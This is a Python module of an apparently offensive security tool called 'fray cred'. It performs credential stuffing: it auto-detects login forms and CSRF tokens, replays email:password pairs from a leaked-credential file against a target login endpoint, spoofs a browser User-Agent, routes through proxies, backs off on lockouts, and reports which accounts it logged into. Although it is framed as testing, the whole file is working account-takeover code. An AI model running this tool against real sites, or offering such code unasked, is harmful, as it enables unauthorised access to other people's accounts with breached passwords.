"""
Fray Cred — credential stuffing / reuse testing

Usage:
    fray cred https://example.com/login --pairs leaked.txt
    fray cred https://example.com/login --pairs leaked.txt --json
    fray cred https://example.com/login --pairs leaked.txt --rate 2 --delay 3

Input format (leaked.txt — one per line):
    user@example.com:password123
    admin@example.com:hunter2

Pairs naturally with `fray leak` which discovers breached credentials.

Features:
    - Automatic login form detection (username/password field names)
    - Configurable rate limiting (requests per second, delay between attempts)
    - Response diffing to detect successful logins vs failures
    - Support for JSON API endpoints and HTML form POST
    - Proxy support (--proxy)
    - Dry-run mode (--dry-run) to preview without sending

Zero dependencies — stdlib only.
"""

import http.client
import json
import os
import re
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from typing import Any, Dict, List, Optional, Tuple


# ── Login Form Detection ──────────────────────────────────────────────

def detect_login_form(url: str, timeout: int = 10,
                      headers: Optional[Dict[str, str]] = None) -> Dict[str, Any]:
    """Probe a URL to detect login form fields and submission method.

    Returns detected username/password field names, form action URL,
    method (POST/JSON), and any CSRF tokens found.
    """
    result: Dict[str, Any] = {
        "url": url,
        "method": "POST",
        "content_type": "application/x-www-form-urlencoded",
        "username_field": "username",
        "password_field": "password",
        "csrf_field": None,
        "csrf_value": None,
        "form_action": url,
        "extra_fields": {},
        "detected": False,
    }

    req_headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }
    if headers:
        req_headers.update(headers)

    try:
        req = urllib.request.Request(url, headers=req_headers)
        ctx = ssl.create_default_context()
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            body = resp.read(65536).decode("utf-8", errors="replace")
            content_type = resp.headers.get("Content-Type", "")

            # JSON API endpoint detection
            if "application/json" in content_type:
                result["content_type"] = "application/json"
                result["method"] = "POST"
                result["detected"] = True
                return result

            # HTML form parsing
            # Find password fields
            pw_fields = re.findall(
                r'<input[^>]*type=["\']password["\'][^>]*name=["\']([^"\']+)["\']',
                body, re.IGNORECASE
            )
            if not pw_fields:
                pw_fields = re.findall(
                    r'<input[^>]*name=["\']([^"\']+)["\'][^>]*type=["\']password["\']',
                    body, re.IGNORECASE
                )
            if pw_fields:
                result["password_field"] = pw_fields[0]
                result["detected"] = True

            # Find username/email fields (text/email input near password)
            user_fields = re.findall(
                r'<input[^>]*(?:type=["\'](?:text|email)["\'])[^>]*name=["\']([^"\']+)["\']',
                body, re.IGNORECASE
            )
            if not user_fields:
                user_fields = re.findall(
                    r'<input[^>]*name=["\']([^"\']+)["\'][^>]*(?:type=["\'](?:text|email)["\'])',
                    body, re.IGNORECASE
                )
            # Filter for likely username/email fields
            user_keywords = ("user", "email", "login", "account", "id", "name")
            for f in user_fields:
                if any(kw in f.lower() for kw in user_keywords):
                    result["username_field"] = f
                    result["detected"] = True
                    break
            if not result["detected"] and user_fields:
                result["username_field"] = user_fields[0]

            # CSRF token detection
            csrf_patterns = [
                r'<input[^>]*name=["\'](_?csrf[_-]?token|_token|csrf|authenticity_token|__RequestVerificationToken)["\'][^>]*value=["\']([^"\']*)["\']',
                r'<input[^>]*value=["\']([^"\']*)["\'][^>]*name=["\'](_?csrf[_-]?token|_token|csrf|authenticity_token|__RequestVerificationToken)["\']',
                r'<meta[^>]*name=["\']csrf-token["\'][^>]*content=["\']([^"\']*)["\']',
            ]
            for pat in csrf_patterns:
                m = re.search(pat, body, re.IGNORECASE)
                if m:
                    groups = m.groups()
                    if len(groups) == 2:
                        result["csrf_field"] = groups[0]
                        result["csrf_value"] = groups[1]
                    elif len(groups) == 1:
                        result["csrf_field"] = "csrf-token"
                        result["csrf_value"] = groups[0]
                    break

            # Form action URL
            form_match = re.search(
                r'<form[^>]*action=["\']([^"\']*)["\']', body, re.IGNORECASE
            )
            if form_match:
                action = form_match.group(1)
                if action and not action.startswith(("http://", "https://")):
                    parsed = urllib.parse.urlparse(url)
                    action = f"{parsed.scheme}://{parsed.netloc}{action}"
                if action:
                    result["form_action"] = action

    except Exception as e:
        result["error"] = str(e)

    return result


# ── Credential Pair Parser ────────────────────────────────────────────

def parse_credential_pairs(filepath: str) -> List[Tuple[str, str]]:
    """Parse credential pairs from a file (email:password, one per line).

    Supports formats:
        user@domain.com:password
        user@domain.com password
        user@domain.com\tpassword
    """
    pairs = []
    try:
        with open(filepath, "r", encoding="utf-8", errors="replace") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                # Try colon separator first
                if ":" in line:
                    idx = line.index(":")
                    user = line[:idx].strip()
                    pw = line[idx+1:].strip()
                elif "\t" in line:
                    parts = line.split("\t", 1)
                    user, pw = parts[0].strip(), parts[1].strip()
                elif " " in line:
                    parts = line.split(None, 1)
                    user, pw = parts[0].strip(), parts[1].strip() if len(parts) > 1 else ""
                else:
                    continue
                if user and pw:
                    pairs.append((user, pw))
    except FileNotFoundError:
        sys.stderr.write(f"  Error: File not found: {filepath}\n")
    except Exception as e:
        sys.stderr.write(f"  Error reading {filepath}: {e}\n")
    return pairs


# ── Credential Test ───────────────────────────────────────────────────

def _send_login(url: str, username_field: str, password_field: str,
                username: str, password: str,
                content_type: str = "application/x-www-form-urlencoded",
                extra_fields: Optional[Dict] = None,
                csrf_field: Optional[str] = None,
                csrf_value: Optional[str] = None,
                headers: Optional[Dict[str, str]] = None,
                proxy: Optional[str] = None,
                timeout: int = 10) -> Dict[str, Any]:
    """Send a single login attempt and capture the response."""
    data: Dict[str, str] = {
        username_field: username,
        password_field: password,
    }
    if csrf_field and csrf_value:
        data[csrf_field] = csrf_value
    if extra_fields:
        data.update(extra_fields)

    req_headers: Dict[str, str] = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/120.0.0.0 Safari/537.36",
    }
    if headers:
        req_headers.update(headers)

    if "application/json" in content_type:
        body = json.dumps(data).encode("utf-8")
        req_headers["Content-Type"] = "application/json"
    else:
        body = urllib.parse.urlencode(data).encode("utf-8")
        req_headers["Content-Type"] = "application/x-www-form-urlencoded"

    try:
        req = urllib.request.Request(url, data=body, headers=req_headers, method="POST")

        if proxy:
            handler = urllib.request.ProxyHandler({
                "http": proxy, "https": proxy
            })
            opener = urllib.request.build_opener(handler)
        else:
            opener = urllib.request.build_opener()

        ctx = ssl.create_default_context()
        start = time.time()
        try:
            with opener.open(req, timeout=timeout) as resp:
                elapsed = time.time() - start
                resp_body = resp.read(32768).decode("utf-8", errors="replace")
                return {
                    "status": resp.status,
                    "headers": dict(resp.headers),
                    "body_length": len(resp_body),
                    "body_snippet": resp_body[:500],
                    "elapsed_ms": round(elapsed * 1000, 1),
                    "redirect_url": resp.url if resp.url != url else None,
                    "error": None,
                }
        except urllib.error.HTTPError as e:
            elapsed = time.time() - start
            resp_body = ""
            try:
                resp_body = e.read(32768).decode("utf-8", errors="replace")
            except Exception:
                pass
            return {
                "status": e.code,
                "headers": dict(e.headers) if e.headers else {},
                "body_length": len(resp_body),
                "body_snippet": resp_body[:500],
                "elapsed_ms": round(elapsed * 1000, 1),
                "redirect_url": None,
                "error": None,
            }
    except Exception as e:
        return {
            "status": 0,
            "error": str(e),
            "elapsed_ms": 0,
        }


def _classify_response(resp: Dict[str, Any], baseline: Optional[Dict[str, Any]] = None) -> str:
    """Classify a login response as success, failure, lockout, or unknown.

    Uses response status, body content, and comparison to baseline (failed login).
    """
    status = resp.get("status", 0)
    body = resp.get("body_snippet", "").lower()
    redirect = resp.get("redirect_url", "")

    # Lockout / rate limit indicators
    lockout_keywords = ["locked", "too many attempts", "rate limit", "temporarily blocked",
                        "account disabled", "captcha", "try again later"]
    if any(kw in body for kw in lockout_keywords) or status == 429:
        return "lockout"

    # Success indicators
    success_keywords = ["dashboard", "welcome", "logout", "my account", "profile",
                        "settings", "signed in", "logged in"]
    if status in (200, 302, 303) and any(kw in body for kw in success_keywords):
        return "success"
    if redirect and any(kw in redirect.lower() for kw in
                        ("dashboard", "home", "account", "profile", "settings")):
        return "success"

    # If we have a baseline, compare body length difference
    if baseline:
        baseline_len = baseline.get("body_length", 0)
        resp_len = resp.get("body_length", 0)
        if baseline_len > 0:
            diff_ratio = abs(resp_len - baseline_len) / max(baseline_len, 1)
            # Significant body length change suggests different response (possible success)
            if diff_ratio > 0.3 and status in (200, 302, 303):
                return "possible_success"

    # Failure indicators
    fail_keywords = ["invalid", "incorrect", "wrong", "failed", "error",
                     "bad credentials", "unauthorized", "not found", "denied"]
    if any(kw in body for kw in fail_keywords) or status in (401, 403):
        return "failure"

    return "unknown"


def run_credential_test(url: str, pairs_file: str,
                        username_field: Optional[str] = None,
                        password_field: Optional[str] = None,
                        content_type: Optional[str] = None,
                        rate: float = 1.0,
                        delay: float = 1.0,
                        max_attempts: int = 0,
                        proxy: Optional[str] = None,
                        headers: Optional[Dict[str, str]] = None,
                        dry_run: bool = False,
                        timeout: int = 10,
                        quiet: bool = False) -> Dict[str, Any]:
    """Run credential stuffing test against a login endpoint.

    Args:
        url: Login endpoint URL
        pairs_file: Path to credential pairs file
        username_field: Override username field name
        password_field: Override password field name
        content_type: Override content type
        rate: Max requests per second
        delay: Delay between attempts in seconds
        max_attempts: Max attempts (0 = unlimited)
        proxy: HTTP/HTTPS proxy URL
        headers: Extra headers
        dry_run: Preview without sending
        timeout: Request timeout
        quiet: Suppress progress output

    Returns:
        Results dict with attempts, successes, lockouts.
    """
    # Parse credential pairs
    pairs = parse_credential_pairs(pairs_file)
    if not pairs:
        return {"error": f"No valid credential pairs found in {pairs_file}", "attempts": []}

    if max_attempts > 0:
        pairs = pairs[:max_attempts]

    # Detect login form if fields not specified
    form = detect_login_form(url, timeout=timeout, headers=headers)
    u_field = username_field or form.get("username_field", "username")
    p_field = password_field or form.get("password_field", "password")
    ct = content_type or form.get("content_type", "application/x-www-form-urlencoded")
    csrf_field = form.get("csrf_field")
    csrf_value = form.get("csrf_value")
    form_action = form.get("form_action", url)

    if not quiet:
        sys.stderr.write(f"\n  🔑 Credential Test: {url}\n")
        sys.stderr.write(f"     Pairs: {len(pairs)} | Fields: {u_field}/{p_field} | "
                         f"Type: {ct.split('/')[-1]}\n")
        if form.get("detected"):
            sys.stderr.write(f"     Form auto-detected ✓\n")
        if csrf_field:
            sys.stderr.write(f"     CSRF: {csrf_field} ✓\n")
        if dry_run:
            sys.stderr.write(f"     [DRY RUN] No requests will be sent\n")
        sys.stderr.flush()

    result: Dict[str, Any] = {
        "url": url,
        "form_action": form_action,
        "form_detected": form.get("detected", False),
        "username_field": u_field,
        "password_field": p_field,
        "content_type": ct,
        "total_pairs": len(pairs),
        "dry_run": dry_run,
        "attempts": [],
        "successes": [],
        "possible_successes": [],
        "lockouts": [],
        "errors": [],
    }

    if dry_run:
        for user, pw in pairs:
            result["attempts"].append({
                "username": user,
                "password": pw[:3] + "***",
                "classification": "dry_run",
            })
        return result

    # Establish baseline with a known-bad login
    baseline = _send_login(
        form_action, u_field, p_field,
        "fray_baseline_test@invalid.tld", "fray_baseline_invalid_pw_9x7z",
        content_type=ct, csrf_field=csrf_field, csrf_value=csrf_value,
        headers=headers, proxy=proxy, timeout=timeout,
    )

    # Run credential tests
    interval = max(1.0 / rate, delay)
    for i, (user, pw) in enumerate(pairs):
        if not quiet:
            sys.stderr.write(
                f"\r  Testing [{i + 1}/{len(pairs)}] {user[:30]}{'...' if len(user) > 30 else ''}"
                f"{'':40}"
            )
            sys.stderr.flush()

        resp = _send_login(
            form_action, u_field, p_field, user, pw,
            content_type=ct, csrf_field=csrf_field, csrf_value=csrf_value,
            headers=headers, proxy=proxy, timeout=timeout,
        )

        classification = _classify_response(resp, baseline)

        attempt = {
            "username": user,
            "password": pw[:3] + "***",
            "status": resp.get("status", 0),
            "elapsed_ms": resp.get("elapsed_ms", 0),
            "body_length": resp.get("body_length", 0),
            "classification": classification,
            "redirect_url": resp.get("redirect_url"),
        }

        if resp.get("error"):
            attempt["error"] = resp["error"]
            result["errors"].append(attempt)
        elif classification == "success":
            result["successes"].append(attempt)
        elif classification == "possible_success":
            result["possible_successes"].append(attempt)
        elif classification == "lockout":
            result["lockouts"].append(attempt)
            if not quiet:
                sys.stderr.write(f"\n  ⚠️  Lockout detected at attempt {i + 1}, pausing...\n")
                sys.stderr.flush()
            time.sleep(30)  # Back off on lockout

        result["attempts"].append(attempt)

        if i < len(pairs) - 1:
            time.sleep(interval)

    if not quiet:
        sys.stderr.write("\r" + " " * 70 + "\r")
        sys.stderr.flush()

    return result


# ── Pretty Print ───────────────────────────────────────────────────────

def print_cred_results(result: Dict[str, Any]) -> None:
    """Pretty-print credential test results."""
    url = result.get("url", "?")
    total = result.get("total_pairs", 0)
    successes = result.get("successes", [])
    possible = result.get("possible_successes", [])
    lockouts = result.get("lockouts", [])
    errors = result.get("errors", [])
    dry_run = result.get("dry_run", False)

    print(f"\n  {'━' * 50}")
    print(f"  🔑 Credential Test Results: {url}")
    print(f"  {'━' * 50}")

    if dry_run:
        print(f"\n  [DRY RUN] {total} pairs would be tested")
        for a in result.get("attempts", [])[:10]:
            print(f"    {a['username']} : {a['password']}")
        if total > 10:
            print(f"    ... and {total - 10} more")
        return

    print(f"\n  Total attempts:  {len(result.get('attempts', []))}")
    print(f"  Form detected:   {'Yes' if result.get('form_detected') else 'No'}")
    print(f"  Fields:          {result.get('username_field')}/{result.get('password_field')}")

    if successes:
        print(f"\n  🔴 CONFIRMED LOGINS ({len(successes)})")
        for s in successes:
            print(f"    ✓ {s['username']} — status {s['status']} "
                  f"({s['elapsed_ms']}ms, {s['body_length']}B)")
            if s.get("redirect_url"):
                print(f"      → {s['redirect_url']}")

    if possible:
        print(f"\n  🟡 POSSIBLE LOGINS ({len(possible)}) — verify manually")
        for p in possible:
            print(f"    ? {p['username']} — status {p['status']} "
                  f"({p['elapsed_ms']}ms, {p['body_length']}B)")

    if lockouts:
        print(f"\n  ⚠️  LOCKOUTS ({len(lockouts)})")
        for l in lockouts:
            print(f"    ⛔ At {l['username']} — account/IP may be locked")

    if errors:
        print(f"\n  ❌ Errors ({len(errors)})")
        for e in errors[:5]:
            print(f"    {e.get('username', '?')}: {e.get('error', 'unknown')}")

    if not successes and not possible:
        print(f"\n  ✅ No successful logins detected ({len(result.get('attempts', []))} tested)")

    print(f"\n  {'━' * 50}")
